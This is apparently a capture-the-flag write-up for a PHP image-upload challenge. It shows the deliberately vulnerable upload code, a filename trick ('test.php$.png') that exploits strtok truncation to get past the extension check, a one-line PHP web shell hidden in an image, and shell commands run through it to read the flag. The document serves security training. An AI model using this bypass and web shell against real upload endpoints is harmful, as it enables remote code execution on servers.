# PHP Sucks
## Description
> I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it <br>
> Created by: ```j4ck4l```

![image](https://github.com/user-attachments/assets/358b95d8-6315-41ba-bcbd-de9d2895f575)

Cleaning up the given php code to look better: -
```php
<?php
$allowedExtensions=['jpg','jpeg','png'];
$errorMsg='';
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['file'])&&isset($_POST['name'])){
	$userName=$_POST['name'];
	$uploadDir='uploaded/'.generateHashedDirectory($userName).'/';
if(!is_dir($uploadDir)){
	mkdir($uploadDir,0750,true);
}
$uploadedFile=$_FILES['file'];
$fileName=$uploadedFile['name'];
$fileTmpName=$uploadedFile['tmp_name'];
$fileError=$uploadedFile['error'];
$fileSize=$uploadedFile['size'];
$fileExt=strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
if(in_array($fileExt,$allowedExtensions)&&$fileSize<200000){
	$fileName=urldecode($fileName);
	$fileInfo=finfo_open(FILEINFO_MIME_TYPE);
	$fileMimeType=finfo_file($fileInfo,$fileTmpName);
	finfo_close($fileInfo);
	$allowedMimeTypes=['image/jpeg','image/jpg','image/png'];
	$fileName=strtok($fileName,chr(7841151584512418084));
	if(in_array($fileMimeType,$allowedMimeTypes)){
		if($fileError===UPLOAD_ERR_OK){
			if(move_uploaded_file($fileTmpName,$uploadDir.$fileName)){
				chmod($uploadDir.$fileName,0440);
				echo"File uploaded successfully. <a href='$uploadDir$fileName' target='_blank'>Open File</a>";
			}else{
			$errorMsg="Error moving the uploaded file.";
			}
		}
		else{
			$errorMsg="File upload failed with error code: $fileError";
			}
	}else{
		$errorMsg="Don't try to fool me, this is not a png file";
}
}else{
	$errorMsg="File size should be less than 200KB, and only png, jpeg, and jpg are allowed";
}}
function generateHashedDirectory($userName){$randomSalt=bin2hex(random_bytes(16));
	$hashedDirectory=hash('sha256',$userName.$randomSalt);
	return $hashedDirectory;
}?>
```

`$fileName=strtok($fileName,chr(7841151584512418084));` -> This stuck out, since it is acting as a null byte i.e. read everything till this `chr(7841151584512418084)` which is a `$` when we actually check it in a php interpreter.

Below is the order of checks: -

1. Extension check using pathinfo().
2. MIME type check using magic bytes. So we should upload a file that has magic bytes that can get past this check (jpg,png).
3. If all checks pass, move the uploaded file into a new directory.

Our end goal is to get a file ending with .php in this directory, but uploading it directly will fail because of the checks.

This is where `$` comes in play, if `test.php$.png` is the file name, it will pass the first check.
```
php > echo pathinfo("test.php$.jpg",PATHINFO_EXTENSION);
jpg
```

The strtok before the 2nd check will get the filename upto the `$`.
```
php > echo strtok("test.php$.jpg",chr(7841151584512418084));
test.php
```

Since the file being uploaded is an actual png, we can either edit any bytes except the magic bytes to include our payload, something like `<?php system($_GET["0"]) ?>`.

Or we can also add our payload as exifdata, or just keep the magic bytes and our payload, anything will work.

Using the above filename and payload, we get a shell.
```
GET /uploaded/xxx/test.php?0=ls+-la+../../
total 3496
drwxr-x--- 1 root     ctf-player    4096 Dec 16 10:49 .
drwxrwxrwx 1 www-data www-data      4096 Dec 17 21:29 ..
-rwxr-x--- 1 root     ctf-player      69 Dec 16 10:36 s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt
-rwxr-x--- 1 root     ctf-player    3939 Dec 16 10:36 upload.php
drwxrwxrwx 1 root     ctf-player 3551232 Dec 19 04:26 uploaded

GET /uploaded/xxx/test.php?0=cat+../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt
flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}
```

## FLag

`flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}`
